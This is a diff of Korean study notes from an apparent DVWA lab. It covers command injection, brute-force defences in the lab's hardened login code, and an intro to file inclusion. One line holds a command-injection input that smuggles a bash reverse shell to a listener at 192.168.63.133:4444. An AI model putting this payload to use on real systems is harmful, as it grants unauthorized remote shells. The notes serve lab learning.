@@ -166,7 +166,8 @@ medium - 127.0.0.1&;&id bash -i >&/dev/tcp/192.168.63.133/4444 0>&1
 
 ```
 
-kali linux
+
+*KALI LINUX*
 ```bash
 -- kali linux 변환
 ┌──(root㉿kali)-[~]
@@ -181,13 +182,61 @@ help
 index.php
 source
 ```
-- kali에서 web shell을 탈취한 것을 볼 수 있다.
+
+>Kali 에서 web shell을 **탈취**한 것을 볼 수 있다.
 
 
 ---
 
 
-### 자동화 공격
-- 무차별 대입 공격
+## 자동화 공격
+
+**공격 방안**
+-  무차별 대입 공격
 - 게시판에 글을 도배
 - 메일, sms 등 을 수백 건
+
+```php
+<?php  
+  
+if( isset( $_POST[ 'Login' ] ) && isset ($_POST['username']) && isset ($_POST['password']) ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );    // Sanitise username input    $user = $_POST[ 'username' ];    $user = stripslashes( $user );    $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    // Sanitise password input    $pass = $_POST[ 'password' ];    $pass = stripslashes( $pass );    $pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    $pass = md5( $pass );    // Default values    $total_failed_login = 3;    $lockout_time       = 15;    $account_locked     = false;    // Check the database (Check user information)    $data = $db->prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' );    $data->bindParam( ':user', $user, PDO::PARAM_STR );    $data->execute();    $row = $data->fetch();    // Check to see if the user has been locked out.    if( ( $data->rowCount() == 1 ) && ( $row[ 'failed_login' ] >= $total_failed_login ) )  {        // User locked out.  Note, using this method would allow for user enumeration!  
+        //echo "<pre><br />This account has been locked due to too many incorrect logins.</pre>";  
+  
+        // Calculate when the user would be allowed to login again        $last_login = strtotime( $row[ 'last_login' ] );        $timeout    = $last_login + ($lockout_time * 60);        $timenow    = time();        /*  
+        print "The last login was: " . date ("h:i:s", $last_login) . "<br />";  
+        print "The timenow is: " . date ("h:i:s", $timenow) . "<br />";  
+        print "The timeout is: " . date ("h:i:s", $timeout) . "<br />";  
+        */  
+  
+        // Check to see if enough time has passed, if it hasn't locked the account        if( $timenow < $timeout ) {            $account_locked = true;            // print "The account is locked<br />";        }  
+    }    // Check the database (if username matches the password)    $data = $db->prepare( 'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );    $data->bindParam( ':user', $user, PDO::PARAM_STR);    $data->bindParam( ':password', $pass, PDO::PARAM_STR );    $data->execute();    $row = $data->fetch();    // If its a valid login...    if( ( $data->rowCount() == 1 ) && ( $account_locked == false ) ) {        // Get users details        $avatar       = $row[ 'avatar' ];        $failed_login = $row[ 'failed_login' ];        $last_login   = $row[ 'last_login' ];        // Login successful        echo "<p>Welcome to the password protected area <em>{$user}</em></p>";  
+        echo "<img src=\"{$avatar}\" />";        // Had the account been locked out since last login?        if( $failed_login >= $total_failed_login ) {  
+            echo "<p><em>Warning</em>: Someone might of been brute forcing your account.</p>";  
+            echo "<p>Number of login attempts: <em>{$failed_login}</em>.<br />Last login attempt was at: <em>{$last_login}</em>.</p>";  
+        }        // Reset bad login count        $data = $db->prepare( 'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;' );        $data->bindParam( ':user', $user, PDO::PARAM_STR );        $data->execute();  
+    } else {        // Login failed        sleep( rand( 2, 4 ) );        // Give the user some feedback        echo "<pre><br />Username and/or password incorrect.<br /><br/>Alternative, the account has been locked because of too many failed logins.<br />If this is the case, <em>please try again in {$lockout_time} minutes</em>.</pre>";        // Update bad login count        $data = $db->prepare( 'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;' );        $data->bindParam( ':user', $user, PDO::PARAM_STR );        $data->execute();  
+    }    // Set the last login time    $data = $db->prepare( 'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;' );    $data->bindParam( ':user', $user, PDO::PARAM_STR );    $data->execute();  
+}  
+  
+// Generate Anti-CSRF token  
+generateSessionToken();  
+  
+?>
+
+```
+
+- Sanitise password input
+	- 사용자가 입력한 데이터나 외부 데이터에 해로운 문자나 악성코드(XSS 공격) 등 <script></script>를 걸러내거나 안전한 형태로 바꾸는 과정 및 라이브러리를 말한다.
+- Reset bad login count
+	- 지속적인 무차별 대입을 시도하면 sleep(rand(2,4))초 코드를 이용하여 로그인을 무차별적으로 대입하는 것을 방지
+
+
+
+---
+
+
+## File Inclusion
+
+웹 어플리케이션에 파일을 불러들이는 기능이 존재할때 서버 내부의 임의의 파일을 불러올 수 있으면 *LFI 취약점*이 있다. 서버 외부의 파일을 불러올 수 있으면 *RFI 취약점*이 있다.
+
+
